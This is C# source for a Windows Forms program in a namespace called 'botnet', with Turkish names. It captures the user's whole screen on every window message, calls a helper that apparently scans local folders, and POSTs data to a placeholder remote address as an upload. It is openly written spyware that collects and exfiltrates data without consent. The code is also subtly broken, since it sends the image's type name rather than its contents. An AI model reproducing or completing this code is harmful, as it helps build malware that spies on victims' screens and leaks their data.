using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Windows.Forms;

namespace botnet
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        pc_bilgisi pbgls = new pc_bilgisi();

        protected override void WndProc(ref Message m)
        {
            ekr();
           // pbgls.processscanner();
            pbgls.kıllklsrlstl();
            veriyolla();
            if (m.Msg == 537)
            {

            }
            base.WndProc(ref m);
        }
        void ekr()
        {
            Bitmap Goruntu = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics GFX = Graphics.FromImage(Goruntu);
            GFX.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size);
            pictureBox1.Image = Goruntu;
        }
        void veriyolla()
        {
            WebClient w = new WebClient();
            NameValueCollection reqparm = new NameValueCollection();
            reqparm.Add("yukle", pictureBox1.Image.ToString());
            w.UploadValues("adres", "POST", reqparm);
        }

        private void Form1_Load(object sender, System.EventArgs e)
        {

        }
    }
}
